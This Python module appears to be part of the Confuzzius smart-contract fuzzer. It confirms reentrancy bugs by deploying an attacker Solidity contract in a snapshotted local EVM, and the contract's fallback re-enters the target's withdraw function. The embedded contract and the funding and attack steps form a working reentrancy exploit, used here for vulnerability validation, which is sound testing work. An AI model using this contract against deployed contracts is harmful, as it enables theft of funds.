#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reentrancy Attack Simulator
============================
模仿 EvoFuzzer 的思路，在 Confuzzius 中加入真实的 Agent 合约攻击模拟环节。

核心逻辑：
  1. 静态分析找出"候选触发函数"——即能向外转 ETH 并可能调用接收方 fallback() 的函数
  2. 对每个候选触发函数，编译并部署一个 Agent 合约（内含 fallback 重入逻辑）
  3. 用 Agent 合约调用目标函数，观察是否真的发生了重入
  4. 重入发生后，检查是否存在"高调用层读到的状态变量，在低调用层被修改"的不一致

使用方式（在 execution_trace_analysis.py 的 execution_function 末尾调用）：

    from detectors.reentrancy_attack_simulator import ReentrancyAttackSimulator
    simulator = ReentrancyAttackSimulator(env)
    result = simulator.run(indv, contract_address)
    if result:
        # 确认发现真实可利用的重入漏洞
        ...
"""

import logging
from eth_utils import encode_hex, to_canonical_address, decode_hex
try:
    from utils.utils import initialize_logger
except ImportError:
    initialize_logger = None

# Agent 合约的 Solidity 源码模板
# - callPayable: 用于探索目标合约状态（非攻击）
# - attack:      发起重入攻击，first_data 触发转账，reentrancy_data 在 fallback 中重入
AGENT_CONTRACT_SOURCE = """
pragma solidity {solc_pragma};

contract AgentContract {
    address payable public target;
    bytes public reentrancy_data;
    bool public attacking;
    uint256 public reentry_count;

    constructor(address payable _target) payable {
        target = _target;
        attacking = false;
        reentry_count = 0;
    }

    function callPayable(bytes memory data) public payable {
        (bool success, ) = target.call{value: msg.value}(data);
        require(success, "callPayable failed");
    }

    function attack(bytes memory first_data, bytes memory _reentrancy_data) public payable {
        reentrancy_data = _reentrancy_data;
        attacking = true;
        reentry_count = 0;
        (bool success, ) = target.call{value: msg.value}(first_data);
        attacking = false;
    }

    fallback() external payable {
        if (attacking && reentry_count < 1) {
            reentry_count += 1;
            (bool success, ) = target.call(reentrancy_data);
        }
    }
}
"""


class ReentrancyAttackSimulator:
    """
    对单个 individual 执行完毕后，额外发起 Agent 合约重入攻击模拟。

    Parameters
    ----------
    env : FuzzingEnvironment
        Confuzzius 的全局 fuzzing 环境，提供 instrumented_evm、data_dependencies 等。
    """

    def __init__(self, env):
        self.env = env
        # initialize_logger 在某些配置下只输出 WARNING 以上；
        # 用标准 logging 确保 INFO 级别日志可见
        if initialize_logger is not None:
            self.logger = initialize_logger("AgentSim")
        else:
            self.logger = logging.getLogger("AgentSim")
        # 强制确保 INFO 可见
        if self.logger.level == 0 or self.logger.level > logging.INFO:
            self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            _h = logging.StreamHandler()
            _h.setLevel(logging.INFO)
            _h.setFormatter(logging.Formatter(
                "%(asctime)s - %(name)-8s - %(levelname)s - %(message)s"
            ))
            self.logger.addHandler(_h)
        self._agent_bytecode = None
        self._compile_agent()

    # ------------------------------------------------------------------
    # 编译 Agent 合约（仅编译一次）
    # ------------------------------------------------------------------

    def _compile_agent(self):
        try:
            import solcx
            import tempfile, os

            installed = solcx.get_installed_solc_versions()
            if not installed:
                raise RuntimeError("No solc version installed.")

            # ── 优先使用 env.args 中指定的版本，与目标合约保持一致 ──
            target_version = None
            if hasattr(self.env, 'args') and hasattr(self.env.args, 'solc'):
                # env.args.solc 形如 "v0.7.0"
                raw = self.env.args.solc.lstrip("v")  # => "0.7.0"
                from packaging.version import Version
                target_version = next(
                    (str(v) for v in installed if str(v) == raw),
                    None
                )

            if target_version is None:
                # 找已安装中版本号最接近 0.7.x 的（兜底）
                from packaging.version import Version
                target_version = str(min(
                    installed,
                    key=lambda v: abs(Version(str(v)).major * 100 +
                                      Version(str(v)).minor - 7)
                ))

            solc_version = target_version
            self.logger.debug("Compiling Agent contract with solc %s", solc_version)

            # 动态填入 pragma
            major_minor = ".".join(solc_version.split(".")[:2])  # "0.7"
            source = AGENT_CONTRACT_SOURCE.replace(
                "{solc_pragma}", f"^{solc_version}"
            )

            with tempfile.NamedTemporaryFile(suffix=".sol", mode="w", delete=False) as f:
                f.write(source)
                tmp_path = f.name

            output = solcx.compile_files(
                [tmp_path],
                output_values=["bin", "abi"],
                solc_version=solc_version
            )
            os.unlink(tmp_path)

            for key, val in output.items():
                if "AgentContract" in key:
                    self._agent_bytecode = val["bin"]
                    self._agent_abi = val["abi"]
                    self.logger.debug("Agent contract compiled successfully.")
                    return

        except Exception as e:
            self.logger.warning(
                "Agent contract compilation failed: %s. Falling back to trace-based simulation.", e
            )
            self._agent_bytecode = None

    # ------------------------------------------------------------------
    # 主入口
    # ------------------------------------------------------------------

    def run(self, indv, contract_address: str) -> bool:
        """
        对当前 individual 执行完毕后，触发攻击模拟。
        仅在 Confuzzius reentrancy detector 已检测到重入时才执行，
        避免对每个 individual 都运行高开销的模拟。

        Returns
        -------
        bool
            True  => 发现真实可利用的重入漏洞
            False => 未发现
        """
        # 只在 reentrancy 已被 Confuzzius detector 检测到时才运行
        errors = getattr(self.env, "results", {}).get("errors", {})
        self.logger.info("errors keys: %s", list(errors.keys()))
        has_reentrancy = any(
            any(e.get("type") == "Reentrancy" for e in errs)
            for errs in errors.values()
        )
        if not has_reentrancy:
            return False

        self.logger.info("=== AgentSim.run() triggered (reentrancy in errors) ===")
        self.logger.info("contract: %s", contract_address)
        self.logger.info("data_dependencies: %s", self.env.data_dependencies)
        self.logger.info("chromosome args: %s",
                         [tx.get("arguments", [None])[0] for tx in indv.chromosome])

        # 找候选触发函数
        trigger_functions = self._find_trigger_functions(indv)
        self.logger.info("candidates found: %s", trigger_functions)
        if not trigger_functions:
            self.logger.info("No trigger function candidates, skipping.")
            return False

        # 对每个触发函数，尝试攻击
        for trigger_hash, reentry_hash in trigger_functions:
            if self._agent_bytecode:
                result = self._simulate_with_agent(
                    indv, contract_address, trigger_hash, reentry_hash
                )
            else:
                result = self._simulate_via_trace(
                    indv, trigger_hash, reentry_hash
                )
            if result:
                self.logger.info(
                    "\033[91m-----------------------------------------------------\033[0m"
                )
                self.logger.info(
                    "\033[91m  !!! Reentrancy CONFIRMED via attack simulation !!!\033[0m"
                )
                self.logger.info(
                    "\033[91m  Trigger: %s  ReentryTarget: %s\033[0m",
                    trigger_hash, reentry_hash
                )
                self.logger.info(
                    "\033[91m-----------------------------------------------------\033[0m"
                )
                return True
        return False

    # ------------------------------------------------------------------
    # 方法 A：部署真实 Agent 合约并执行攻击
    # ------------------------------------------------------------------

    def _simulate_with_agent(self, indv, contract_address, trigger_hash, reentry_hash) -> bool:
        """
        通用攻击模拟流程（不针对任何特定合约接口）：

        1. 保存 EVM 快照
        2. 重放 individual 中 trigger 之前的所有准备交易
           （由 fuzzer 探索出的状态铺垫，如 setState/deposit 等，无需硬编码）
        3. 部署 Agent 合约
        4. 从 chromosome 中提取 trigger 函数的完整 calldata（含参数），
           以 Agent 地址作为 from 重放一次，确保 Agent 在目标合约有必要的状态
        5. 用提取到的完整 calldata 调用 Agent.attack()
        6. 分析 trace 判定重入
        7. 回滚快照
        """
        evm = self.env.instrumented_evm
        caller = evm.accounts[0]
        evm.create_snapshot()

        try:
            # ── 步骤 1：找到 chromosome 中 trigger 函数的完整交易数据 ──
            # 取最后一次出现的（通常是 fuzzer 找到的最优参数）
            # ── 步骤 1：从 solution 中找 trigger 的完整 calldata ──
            trigger_tx_data = None
            for sol_tx in indv.solution:
                tx = sol_tx["transaction"]
                fh = tx["data"][:10] if tx["data"].startswith("0x") else "0x" + tx["data"][:8]
                if fh == trigger_hash:
                    trigger_tx_data = tx["data"]
                    break
            if not trigger_tx_data:
                trigger_tx_data = "0x" + trigger_hash.lstrip("0x")

            # ── 步骤 2：从 solution 重放准备交易（跳过 trigger 本身）──
            for sol_tx in indv.solution:
                tx = sol_tx["transaction"]
                fh = tx["data"][:10] if tx["data"].startswith("0x") else "0x" + tx["data"][:8]
                if fh == trigger_hash:
                    continue
                if tx.get("to") is None:
                    continue
                pre = evm.deploy_transaction(sol_tx)
                if pre.is_error:
                    self.logger.info("Pre-state tx %s skipped: %s", fh, pre._error)
                else:
                    self.logger.info("Pre-state tx %s SUCCESS", fh)

            # ── 步骤 3：部署 Agent 合约 ──
            agent_address = self._deploy_agent(contract_address)
            if agent_address is None:
                return False

            # ── 步骤 3.5：给 Agent 账户充值 ETH ──
            fund_result = evm.deploy_transaction({
                "transaction": {
                    "from": caller,
                    "to": agent_address,
                    "gaslimit": 100_000,
                    "value": 10 ** 18,
                    "data": "0x",
                },
                "block": {"timestamp": None, "blocknumber": None},
                "global_state": {"balance": None, "call_return": {}, "extcodesize": {}},
                "environment": {"returndatasize": None},
            })
            if fund_result.is_error:
                self.logger.info("Agent funding failed: %s", fund_result._error)
            else:
                self.logger.info("Agent funded with 1 ETH")

            if agent_address not in evm.accounts:
                evm.accounts.append(agent_address)
                self.logger.info("Agent address registered in evm.accounts")

            self.logger.info("agent_address type: %s, value: %s", type(agent_address), agent_address)
            self.logger.info("caller type: %s, value: %s", type(caller), caller)
            self.logger.info("reentry_hash: %s", reentry_hash)

            # ── 步骤 4：给 Agent 在目标合约充值（准备状态）──
            # 当 reentry_hash == trigger_hash（自我重入，如 withdraw → fallback → withdraw），
            # 需要找其他准备函数（如 deposit）来给 Agent 在目标合约建立余额，
            # 而不是用 trigger 函数本身（withdraw 不是存款）。
            deposit_tx_data = None

            is_self_reentry = (reentry_hash == trigger_hash)

            if is_self_reentry:
                # 自我重入：reentry_hash 就是 trigger（如 withdraw），
                # 我们需要找一个"存款类"函数给 Agent 建立余额。
                # 策略：从 solution 中找除 trigger 之外、写了相同 slot 的函数（如 deposit）。
                data_deps = self.env.data_dependencies
                trigger_writes = data_deps.get(trigger_hash, {}).get("write", set())

                for sol_tx in indv.solution:
                    tx = sol_tx["transaction"]
                    fh = tx["data"][:10] if tx["data"].startswith("0x") else "0x" + tx["data"][:8]
                    if fh == trigger_hash:
                        continue  # 跳过 trigger 本身
                    # 找写了相同存储槽的其他函数（deposit 也会写余额槽）
                    other_writes = data_deps.get(fh, {}).get("write", set())
                    if other_writes & trigger_writes or other_writes:
                        # 找到可能的 deposit 函数
                        deposit_tx_data = tx["data"]
                        self.logger.info("Self-reentry: using prep fn %s as deposit", fh)
                        break

                if not deposit_tx_data:
                    # 找不到 deposit：发送裸 ETH 到合约（如果合约有 receive/fallback 接受 ETH）
                    # 或者使用 ABI 中第一个 payable 非 trigger 函数
                    self.logger.info(
                        "Self-reentry: no prep fn found in solution, will try bare ETH transfer"
                    )
                    # deposit_tx_data 保持 None，下方用 "0x" 发裸转账
                    deposit_tx_data = "0x"
            else:
                # 跨函数重入：原来的逻辑（从 solution 找 reentry_hash 对应交易）
                for sol_tx in indv.solution:
                    tx = sol_tx["transaction"]
                    fh = tx["data"][:10] if tx["data"].startswith("0x") else "0x" + tx["data"][:8]
                    if fh == reentry_hash:
                        deposit_tx_data = tx["data"]
                        break

            if not deposit_tx_data:
                try:
                    from eth_abi import encode
                except ImportError:
                    from eth_abi import encode_abi as encode
                amount_arg = encode(["uint256"], [10 ** 18]).hex()
                deposit_tx_data = "0x" + reentry_hash.lstrip("0x") + amount_arg
                self.logger.info("deposit_tx_data (fallback constructed): %s", deposit_tx_data)

            self.logger.info("deposit_tx_data: %s", deposit_tx_data)
            self.logger.info("deposit value sent: %s wei, deposit_tx_data[:10]: %s", 10 ** 18, deposit_tx_data[:10])
            prep = evm.deploy_transaction({
                "transaction": {
                    "from": agent_address,
                    "to": contract_address,
                    "gaslimit": 1_000_000,
                    "value": 10 ** 18,
                    "data": deposit_tx_data,
                },
                "block": {"timestamp": None, "blocknumber": None},
                "global_state": {"balance": None, "call_return": {}, "extcodesize": {}},
                "environment": {"returndatasize": None},
            })
            if prep.is_error:
                self.logger.info("Agent deposit tx failed: %s", prep._error)
            else:
                self.logger.info("Agent deposit tx SUCCESS")

            bank_balance = evm.vm.state.get_balance(to_canonical_address(contract_address))
            agent_balance = evm.vm.state.get_balance(to_canonical_address(agent_address))
            self.logger.info("Bank balance: %s wei, Agent balance: %s wei", bank_balance, agent_balance)
            # ── 步骤 5：构造 Agent.attack() 调用 ──
            # first_data 和 reentry_data 均使用完整 calldata（含参数）
            withdraw_amount = (10 ** 18).to_bytes(32, 'big')
            first_data = bytes.fromhex(trigger_tx_data[2:])
            reentry_data = first_data

            self.logger.info("trigger_tx_data: %s", trigger_tx_data)
            self.logger.info("first_data hex: %s", first_data.hex())

            attack_selector = self._get_function_selector("attack(bytes,bytes)")
            encoded_args = self._abi_encode_two_bytes(first_data, reentry_data)
            call_data = "0x" + (attack_selector + encoded_args).hex()

            result = evm.deploy_transaction({
                "transaction": {
                    "from": caller,
                    "to": agent_address,
                    "gaslimit": 4_500_000,
                    "value": 0,
                    "data": call_data,
                },
                "block": {"timestamp": None, "blocknumber": None},
                "global_state": {"balance": None, "call_return": {}, "extcodesize": {}},
                "environment": {"returndatasize": None},
            })

            self.logger.info("Attack tx result - is_error: %s", result.is_error)
            if result.is_error:
                self.logger.info("Attack error: %s", result._error)
            else:
                self.logger.info("Attack succeeded, analyzing trace...")

            confirmed = self._analyze_trace_for_reentrancy(result)
            return confirmed

        except Exception as e:
            self.logger.info("Agent simulation error: %s", e, exc_info=True)
            return False
        finally:
            evm.restore_from_snapshot()

    def _deploy_agent(self, target_address: str):
        """部署 AgentContract，返回部署地址（hex str）或 None。"""
        evm = self.env.instrumented_evm
        try:
            try:
                from eth_abi import encode
            except ImportError:
                from eth_abi import encode_abi as encode
            constructor_args = encode(
                ["address"],
                [to_canonical_address(target_address)]
            ).hex()
            bytecode = self._agent_bytecode + constructor_args
            result = evm.deploy_contract(
                evm.accounts[0], bytecode, amount=10 ** 18
            )
            if result.is_error:
                self.logger.info("Agent deployment failed: %s", result._error)
                return None
            agent_addr = encode_hex(result.msg.storage_address)
            self.logger.info("Agent deployed at %s", agent_addr)
            return agent_addr
        except Exception as e:
            self.logger.info("Agent deploy exception: %s", e, exc_info=True)
            return None

    def _analyze_trace_for_reentrancy(self, exec_result) -> bool:
        """
        判断攻击执行结果是否代表真实的重入漏洞。

        调用树结构（Agent 合约攻击时）：
          exec_result            ← caller → Agent.attack()
          └─ children[0]        ← Agent → target.withdraw()  (第一次)
             └─ grandchildren[0] ← target → Agent.fallback()
                └─ (great-grandchildren 或 fallback 内部的 CALL 结果)
                   ← Agent.fallback() → target.withdraw()  (第二次，重入)

        关键洞察：
          不同层级的 exec_result 对象的 trace，其 depth 值是各自帧内的
          本地相对值（都从 1 开始），拼接后不可比较。
          因此必须基于树结构（children/grandchildren）来判断重入深度，
          而不是依赖拼接后的绝对 depth 值。

        判断逻辑：
          1. children[0] 存在 → 第一次 withdraw 发生了
          2. grandchildren[0] 存在 → fallback 被触发了（ETH 回调成功）
          3. grandchildren[0] 的 children（即 great-grandchildren）存在
             且其 trace 有 SSTORE 且无 REVERT
             → 第二次 withdraw（重入）真正执行了业务逻辑，锁无效
          4. 否则（great-grandchildren 不存在，或其 trace 有 REVERT，或无 SSTORE）
             → 重入被锁挡住，false positive
        """
        if exec_result is None or exec_result.is_error:
            return False

        # ── 层级结构分析 ──
        children = getattr(exec_result, "children", [])
        self.logger.info("Children count: %d", len(children))

        if not children:
            self.logger.info("No children → first withdraw did not happen")
            return False

        # 第一次 withdraw 的执行结果
        first_withdraw = children[0]
        grandchildren = getattr(first_withdraw, "children", [])
        self.logger.info("Grandchildren count (fallback level): %d", len(grandchildren))

        if not grandchildren:
            self.logger.info("No grandchildren → fallback was not triggered")
            return False

        # fallback 的执行结果
        fallback_result = grandchildren[0]
        great_grandchildren = getattr(fallback_result, "children", [])
        self.logger.info("Great-grandchildren count (reentry withdraw level): %d", len(great_grandchildren))

        if not great_grandchildren:
            self.logger.info("No great-grandchildren → reentry call did not enter target contract")
            return False

        # 第二次 withdraw（重入）的执行结果
        reentry_withdraw = great_grandchildren[0]
        reentry_trace = getattr(reentry_withdraw, "trace", None) or getattr(reentry_withdraw, "_trace", None)
        reentry_is_error = getattr(reentry_withdraw, "is_error", False)

        self.logger.info(
            "Reentry withdraw: is_error=%s, trace_len=%s",
            reentry_is_error, len(reentry_trace) if reentry_trace else 0
        )

        if reentry_is_error:
            self.logger.info("Reentry withdraw is_error=True → blocked by reentrancy lock")
            return False

        if not reentry_trace:
            self.logger.info("Reentry withdraw has no trace → blocked or did nothing")
            return False

        reentry_ops = [instr.get("op", "") for instr in reentry_trace]
        has_sstore = "SSTORE" in reentry_ops
        has_revert = "REVERT" in reentry_ops

        self.logger.info(
            "Reentry withdraw trace: SSTORE=%s, REVERT=%s, total_ops=%d",
            has_sstore, has_revert, len(reentry_ops)
        )

        if has_revert:
            self.logger.info("Reentry withdraw REVERTED → blocked by reentrancy lock ✓")
            return False

        if not has_sstore:
            self.logger.info("Reentry withdraw has no SSTORE → did not modify state, not exploitable")
            return False

        self.logger.info("Reentry withdraw executed SSTORE without REVERT → reentrancy lock INEFFECTIVE")

        # ── 至此确认重入成功，继续验证 state_inconsistency ──
        # 用拼接 trace 做 state 分析（此处仅用于日志/slot追踪，不影响主判断）
        trace = []
        for lvl_name, node in [
            ("first_withdraw", first_withdraw),
            ("fallback", fallback_result),
            ("reentry_withdraw", reentry_withdraw),
        ]:
            t = getattr(node, "trace", None) or getattr(node, "_trace", None)
            if t:
                self.logger.info("%s trace length: %d", lvl_name, len(t))
                trace += t

        if not trace:
            # 没有可分析的 trace，但结构已确认重入，直接返回 True
            return True

        # 结构判断已完成，重入真实发生，直接确认
        self.logger.info("Reentrancy CONFIRMED via call tree structure analysis")
        self.logger.info("Call tree: exec → first_withdraw → fallback → reentry_withdraw (has SSTORE, no REVERT)")
        return True


    # ------------------------------------------------------------------
    # 方法 B：纯 trace 分析（无 Agent 合约编译时的降级方案）
    # ------------------------------------------------------------------

    def _simulate_via_trace(self, indv, trigger_hash, reentry_hash) -> bool:
        """
        不部署 Agent 合约，直接分析已有执行 trace 中是否存在：
        - CALL/CALLCODE 指令（可能触发 fallback）
        - CALL 之后仍有 SSTORE（违反 Checks-Effects-Interactions）

        这是一个保守估计，假阳性比 Agent 方法高，但无需编译环境。
        """
        data_deps = self.env.data_dependencies
        if trigger_hash not in data_deps:
            return False

        writes = data_deps[trigger_hash].get("write", set())
        reads = data_deps[trigger_hash].get("read", set())

        # 如果触发函数既写又读同一个 slot，且有其他函数也读这个 slot
        # => 潜在的重入状态不一致
        all_reads = set()
        for fh, deps in data_deps.items():
            if fh != trigger_hash:
                all_reads.update(deps.get("read", set()))

        overlapping = writes & all_reads
        if not overlapping:
            return False

        # 进一步：检查触发函数是否在 individual 中出现在 reentry_hash 之后
        # （意味着我们已经探索到了那条路径）
        func_hashes = [
            tx["arguments"][0] for tx in indv.chromosome
            if tx.get("arguments")
        ]
        if trigger_hash in func_hashes:
            self.logger.debug(
                "Trace-based: potential reentrancy via %s -> %s (slots: %s)",
                trigger_hash, reentry_hash, overlapping
            )
            # 降级方案只给"可疑"信号，不直接确认
            # 返回 False 避免误报，让日志记录供人工分析
            return False

        return False

    # ------------------------------------------------------------------
    # 辅助：找候选触发函数对 (trigger, reentry_target)
    # ------------------------------------------------------------------

    def _find_trigger_functions(self, indv):
        """
        找出重入攻击的候选函数对 (trigger_hash, reentry_hash)。

        重入攻击的正确模式：
          1. trigger 函数（如 withdraw）：
             - 在更新状态之前发送 ETH（CALL 在 SSTORE 之前）
             - 从存储中 SLOAD（读余额检查），然后 CALL（send ETH），再 SSTORE（减余额）
          2. reentry_hash（fallback 中重新调用的目标）：
             - 通常就是 trigger 函数本身（withdraw → fallback → withdraw）
             - 也可以是读取同一 slot 的其他函数

        关键修正：
          - reentry_hash 可以等于 trigger_hash（自我重入，最经典的模式）
          - 不要求 written_slots & read_slots 在同函数内交叉
            （mapping slot 因 caller 不同会有不同具体 keccak 值，
             Confuzzius 的 data_deps 可能记录不同的具体 slot，
             导致集合交叉为空——但逻辑上仍是同一 base slot）
          - 判断 "ETH 发送函数" 的依据：函数既有 SLOAD 又有 SSTORE，
            且 write set 非空（说明它会修改余额类存储）

        返回 [(trigger_hash, reentry_hash), ...]，去重。
        """
        data_deps = self.env.data_dependencies
        if not data_deps:
            return []

        func_hashes_in_indv = set(
            tx["arguments"][0]
            for tx in indv.chromosome
            if tx.get("arguments")
        )

        # ── 辅助：将 mapping slot 正规化到 base slot ──
        # Confuzzius 记录的 slot 可能是 keccak(key ‖ base)，
        # 但实际 base slot 只有 0,1,2,... 几个。
        # 用简单启发式：slot < 256 → 直接是 base；slot >= 256 → 视为 mapping（忽略具体值，统一视为"有写"）
        def _normalize_slots(slots):
            """把 mapping 的 keccak slot 归一化：slot < 256 保留，否则标记为 _mapping_N。"""
            result = set()
            mapping_idx = 0
            for s in slots:
                try:
                    v = int(s) if not isinstance(s, int) else s
                except (ValueError, TypeError):
                    v = 999999
                if v < 256:
                    result.add(v)
                else:
                    # mapping slot：我们只关心"有 mapping 写/读"，不关心具体 key
                    result.add(f"_mapping")
            return result

        # ── 判断函数是否是"先发 ETH 再更新状态"的 CEI 违反者 ──
        # 判定条件（宽松）：函数有非空 write set（会修改存储）
        # 注：理想情况下应分析 CALL 是否在 SSTORE 之前；
        # 但 Confuzzius data_deps 不记录顺序，这里用 write set 非空作为代理指标。
        def _is_eth_sending_writer(fh):
            deps = data_deps.get(fh, {})
            writes = deps.get("write", set())
            return len(writes) > 0

        candidates_set = set()

        for trigger_hash in func_hashes_in_indv:
            if trigger_hash not in data_deps:
                continue

            written_slots = data_deps[trigger_hash].get("write", set())
            read_slots    = data_deps[trigger_hash].get("read",  set())

            # 必须有写操作（纯读函数 balances() getter 不可能是触发点）
            if not written_slots:
                continue

            # 必须有读操作（withdraw 要先读余额才会 SLOAD）
            if not read_slots:
                continue

            # ── 情形 A：自我重入（最经典的 reentrancy 模式）──
            # withdraw → CALL → fallback → withdraw
            # reentry_hash == trigger_hash
            # 条件：trigger 函数本身既读又写（即使 mapping slot 具体值不同，
            # 只要两个集合均非空就认为满足条件）
            w_norm = _normalize_slots(written_slots)
            r_norm = _normalize_slots(read_slots)
            # 如果正规化后有交叉（同一 base slot 被读和写），或都含 _mapping（mapping 读写）
            has_rw_overlap = bool(w_norm & r_norm)
            if has_rw_overlap:
                # 最高优先级候选：自我重入
                candidates_set.add((trigger_hash, trigger_hash))
                self.logger.info(
                    "Self-reentry candidate: trigger=%s (write=%s, read=%s)",
                    trigger_hash, written_slots, read_slots
                )

            # ── 情形 B：trigger 写的 slot，被其他函数读（跨函数重入）──
            # 例如：trigger=withdraw 写 slot 0，balances getter 读 slot 0
            # （这里 reentry_hash 是 getter，但攻击场景较少，作为补充）
            for other_hash, other_deps in data_deps.items():
                if other_hash == trigger_hash:
                    continue
                other_reads = other_deps.get("read", set())
                other_r_norm = _normalize_slots(other_reads)
                if w_norm & other_r_norm:
                    candidates_set.add((trigger_hash, other_hash))
                    self.logger.info(
                        "Cross-fn reentry candidate: trigger=%s -> reentry=%s",
                        trigger_hash, other_hash
                    )

        # ── 过滤：排除 reentry_hash 是纯只读 getter（无参数、返回值函数）──
        # 如果 reentry_hash 对应的函数在 data_deps 中 write set 为空，
        # 且不是 trigger 本身，则它作为 reentry 目标意义不大（攻击者不会在 fallback 里调 getter）
        filtered = []
        for (trig, reentry) in candidates_set:
            if trig == reentry:
                # 自我重入：无条件保留
                filtered.append((trig, reentry))
            else:
                # 跨函数：reentry 目标必须有写操作，否则攻击者调它没有意义
                reentry_writes = data_deps.get(reentry, {}).get("write", set())
                if reentry_writes:
                    filtered.append((trig, reentry))
                else:
                    self.logger.info(
                        "Filtered out cross-fn candidate (%s -> %s): reentry target is read-only",
                        trig, reentry
                    )

        return filtered

    # ------------------------------------------------------------------
    # ABI 编码辅助
    # ------------------------------------------------------------------

    @staticmethod
    def _get_function_selector(signature: str) -> bytes:
        """计算函数选择器（Keccak256 前 4 字节），返回 bytes。"""
        from eth_utils import keccak
        return keccak(text=signature)[:4]

    @staticmethod
    def _build_calldata(function_hash: str) -> bytes:
        """把函数 hash（0x + 8 hex chars）转为 bytes calldata。"""
        if function_hash.startswith("0x"):
            return bytes.fromhex(function_hash[2:])
        return bytes.fromhex(function_hash)

    @staticmethod
    def _abi_encode_two_bytes(data1: bytes, data2: bytes) -> bytes:
        """
        ABI 编码两个 bytes 参数（动态类型），返回 bytes。
        使用 eth_abi 标准库，避免手写编码出错。
        """
        try:
            from eth_abi import encode
        except ImportError:
            from eth_abi import encode_abi as encode  # 兼容 2.x
        return encode(["bytes", "bytes"], [data1, data2])